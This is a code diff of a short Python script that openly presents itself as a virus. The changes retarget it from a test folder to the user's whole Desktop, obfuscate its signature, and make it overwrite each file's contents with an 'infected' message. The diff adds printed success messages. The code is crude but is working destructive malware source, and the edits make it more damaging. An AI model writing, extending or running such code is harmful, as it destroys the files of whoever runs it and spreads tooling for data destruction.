@@ -1,14 +1,14 @@
 import os
 import time
-import sys
 
-VIRUS_SIGNATURE = "softwareOptimization"
 
-TARGET_FOLDER = os.path.expanduser("~/Desktop/virus")
+VIRUS_SIGNATURE = "s0fTw4R30pT1m1z4t10n"
+
+TARGET_FOLDER = os.path.expanduser("~/Desktop")
 
 
 def generate_new_signature():
-    return "NEW_VIRUS_SIGNATURE_" + str(int(time.time()))
+    return "s0fTw4R30pT1m1z4t10n" + str(int(time.time()))
 
 
 def infect_files():
@@ -26,7 +26,7 @@ def infect(file_path):
     # check if it is already infected
     if VIRUS_SIGNATURE not in content:
         with open(file_path, "w") as f:
-            f.write(content + "\n" + VIRUS_SIGNATURE)
+            f.write("This file has been infected by a virus.\n" + VIRUS_SIGNATURE)
 
 
 def change_signature():
@@ -36,13 +36,15 @@ def change_signature():
 
 
 def trigger_virus():
-    print("Virüs activated!")
+    print("Virus activated!")
 
 
 if __name__ == "__main__":
     print("virus signature: " + VIRUS_SIGNATURE)
     trigger_virus()
     infect_files()
+    print("Virus infected to the files successfully!")
     time.sleep(10)
     change_signature()
+    print("Virus signature changed successfully!")
     infect_files()
